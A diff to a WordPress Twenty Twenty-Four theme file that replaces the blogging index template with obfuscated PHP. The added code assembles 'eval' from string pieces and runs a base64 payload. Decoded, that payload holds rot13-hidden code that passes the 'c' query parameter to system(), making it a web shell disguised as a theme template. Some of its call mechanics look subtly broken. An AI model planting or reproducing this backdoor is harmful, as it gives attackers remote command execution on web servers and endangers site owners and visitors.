@@ -1,33 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Blogging index template
- * Slug: twentytwentyfour/template-index-blogging
- * Template Types: index, home
- * Viewport width: 1400
- * Inserter: no
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IE95YnR0dmF0IHZhcXJrIGdyemN5bmdyCiAqIEZ5aHQ6IGdqcmFnbGdqcmFnbHNiaGUvZ3J6Y3luZ3ItdmFxcmstb3lidHR2YXQKICogR3J6Y3luZ3IgR2xjcmY6IHZhcXJrLCB1YnpyCiAqIEl2cmpjYmVnIGp2cWd1OiAxNDAwCiAqIFZhZnJlZ3JlOiBhYgogKi8KPz4KCjwhLS0gamM6Z3J6Y3luZ3ItY25lZyB7XCJmeWh0XCI6XCJ1cm5xcmVcIixcIm5lcm5cIjpcInVybnFyZVwiLFwiZ250QW56clwiOlwidXJucXJlXCJ9IC8tLT4KCjwhLS0gamM6dGViaGMge1wiZ250QW56clwiOlwiem52YVwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wib3licHhUbmNcIjpcIjBcIixcInpuZXR2YVwiOntcImdiY1wiOlwiMFwifX19LFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicGJhZmdlbnZhcnFcIn19IC0tPgo8em52YSBweW5mZj1cImpjLW95YnB4LXRlYmhjXCIgZmdseXI9XCJ6bmV0dmEtZ2JjOjBcIj4KCTwhLS0gamM6dXJucXZhdCB7XCJ5cmlyeVwiOjEsXCJmZ2x5clwiOntcImdsY2J0ZW5jdWxcIjp7XCJ5dmFyVXJ2dHVnXCI6XCIxXCJ9LFwiZmNucHZhdFwiOntcImNucXF2YXRcIjp7XCJnYmNcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw1MFwifX19fSAtLT4KCTx1MSBweW5mZj1cImpjLW95YnB4LXVybnF2YXRcIiBmZ2x5cj1cImNucXF2YXQtZ2JjOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKTt5dmFyLXVydnR1ZzoxXCI+PD9jdWMgcmZwX3VnenlfciggJ0puZ3B1LCBFcm5xLCBZdmZncmEnLCAnZ2pyYWdsZ2pyYWdsc2JoZScgKTsgPz48L3UxPgoJPCEtLSAvamM6dXJucXZhdCAtLT4KCgk8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc2JoZS9jYmZnZi0xLXBieVwifSAvLS0+Cjwvem52YT4KPCEtLSAvamM6dGViaGMgLS0+Cgo8IS0tIGpjOmdyemN5bmdyLWNuZWcge1wiZnlodFwiOlwic2JiZ3JlXCIsXCJuZXJuXCI6XCJzYmJncmVcIixcImdudEFuenJcIjpcInNiYmdyZVwifSAvLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-
-<!-- wp:template-part {"slug":"header","area":"header","tagName":"header"} /-->
-
-<!-- wp:group {"tagName":"main","style":{"spacing":{"blockGap":"0","margin":{"top":"0"}}},"layout":{"type":"constrained"}} -->
-<main class="wp-block-group" style="margin-top:0">
-	<!-- wp:heading {"level":1,"style":{"typography":{"lineHeight":"1"},"spacing":{"padding":{"top":"var:preset|spacing|50"}}}} -->
-	<h1 class="wp-block-heading" style="padding-top:var(--wp--preset--spacing--50);line-height:1"><?php esc_html_e( 'Watch, Read, Listen', 'twentytwentyfour' ); ?></h1>
-	<!-- /wp:heading -->
-
-	<!-- wp:pattern {"slug":"twentytwentyfour/posts-1-col"} /-->
-</main>
-<!-- /wp:group -->
-
-<!-- wp:template-part {"slug":"footer","area":"footer","tagName":"footer"} /-->
